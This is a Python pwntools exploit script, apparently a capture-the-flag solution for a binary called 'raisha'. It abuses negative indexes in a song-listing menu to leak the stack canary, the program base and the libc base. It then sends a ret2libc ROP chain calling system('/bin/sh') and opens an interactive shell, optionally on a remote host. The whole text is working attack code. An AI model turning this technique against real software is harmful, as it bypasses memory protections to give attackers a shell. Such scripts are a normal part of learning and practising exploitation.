from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
b *vuln
continue
""".format(**locals())

exe = "./raisha"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"

## -21 canary
## -3 program address
## -10 address of _rtd_global

needle = b"[2] list song"
offset = 10

libc = elf.libc
io = start()

io.sendlineafter(needle, b"2")
io.sendlineafter(b": ", b"-21")
canary = int(io.recvline().strip(), 16)
log.info("canary: " + hex(canary))

io.sendlineafter(needle, b"2")
io.sendlineafter(b": ", b"-19")
elf.address = int(io.recvline().strip(), 16) - 0x4160
log.info("pie base: " + hex(elf.address))

io.sendlineafter(needle, b"2")
io.sendlineafter(b": ", b"-10")
libc.address = int(io.recvline().strip(), 16) - 0x5EE000
log.info("libc base: " + hex(libc.address))

pop_rdi = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
payload = flat(
    {
        offset: [
            canary,
            b"A" * 8,
            pop_rdi + 1,
            pop_rdi,
            next(libc.search(b"/bin/sh")),
            libc.sym["system"],
        ]
    }
)

io.sendlineafter(needle, b"1")
io.sendlineafter(b": ", b"1")
io.sendline(payload)
io.interactive()
